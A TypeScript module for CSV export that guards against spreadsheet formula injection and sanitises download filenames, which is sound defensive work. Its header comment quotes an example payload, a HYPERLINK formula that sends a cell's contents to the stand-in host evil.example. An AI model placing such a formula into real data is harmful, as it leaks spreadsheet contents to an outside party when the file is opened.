/**
 * CSV generation.
 *
 * Two things here are not cosmetic.
 *
 * FORMULA INJECTION. A cell beginning with `=`, `+`, `-` or `@` is executed as
 * a formula when the file is opened in Excel or LibreOffice. Client names,
 * locations and notes in this product are typed by users, so a name like
 * `=HYPERLINK("http://evil.example?q="&A1,"klik")` is a real value that a
 * planner could be handed by anyone who can get a name into the system. The
 * export is opened on a planner's own machine, which is exactly where you do
 * not want someone else's text to be executable. Such cells are prefixed with
 * an apostrophe, which spreadsheets strip on display and treat as literal text.
 *
 * The exception matters as much as the rule: `-12.5` is a negative number, not
 * an attack. Neutralising it would corrupt every negative figure in the file,
 * so plain numbers are left alone.
 *
 * SEMICOLON, NOT COMMA. Dutch Excel uses `;` as its list separator; a
 * comma-separated file opens as a single unusable column. The UTF-8 BOM is
 * there for the same practical reason — without it Excel reads the file as
 * latin-1 and every `ë` in a client's name is mangled.
 */
export const CSV_DELIMITER = ';';

/** Excel needs this to recognise the file as UTF-8. */
export const UTF8_BOM = '﻿';

const FORMULA_TRIGGERS = new Set(['=', '+', '-', '@', '\t', '\r']);

/** A plain number, which must stay a number even when it starts with a minus. */
const PLAIN_NUMBER = /^-?\d+(?:[.,]\d+)?$/;

export function neutralizeFormula(value: string): string {
  const first = value[0];
  if (first === undefined) return value;
  if (PLAIN_NUMBER.test(value)) return value;
  return FORMULA_TRIGGERS.has(first) ? `'${value}` : value;
}

export function escapeCell(value: string): string {
  const safe = neutralizeFormula(value);
  const needsQuotes =
    safe.includes('"') ||
    safe.includes(CSV_DELIMITER) ||
    safe.includes('\n') ||
    safe.includes('\r') ||
    safe !== safe.trim();

  return needsQuotes ? `"${safe.replaceAll('"', '""')}"` : safe;
}

export type CsvValue = string | number | null | undefined;

export function formatCell(value: CsvValue): string {
  if (value === null || value === undefined) return '';
  // Numbers are written with a comma as the decimal separator, matching the
  // locale that the semicolon delimiter already commits us to.
  if (typeof value === 'number') {
    return Number.isFinite(value) ? String(value).replace('.', ',') : '';
  }
  return value;
}

export function toCsv(
  headers: readonly string[],
  rows: readonly (readonly CsvValue[])[],
): string {
  const lines = [
    headers.map((header) => escapeCell(header)).join(CSV_DELIMITER),
    ...rows.map((row) =>
      row.map((cell) => escapeCell(formatCell(cell))).join(CSV_DELIMITER),
    ),
  ];
  // CRLF: the line ending every spreadsheet agrees on.
  return UTF8_BOM + lines.join('\r\n') + '\r\n';
}

/**
 * A filename that cannot escape the Content-Disposition header.
 *
 * The organisation name goes in here, and that is user input. Anything but
 * letters, digits, dash and underscore is replaced.
 */
export function csvFilename(prefix: string, from: string, to: string): string {
  const safePrefix = prefix
    .normalize('NFKD')
    .replace(/[^a-zA-Z0-9]+/g, '-')
    .replace(/^-+|-+$/g, '')
    .toLowerCase()
    .slice(0, 40);
  return `${safePrefix || 'rapportage'}-${from}-tot-${to}.csv`;
}
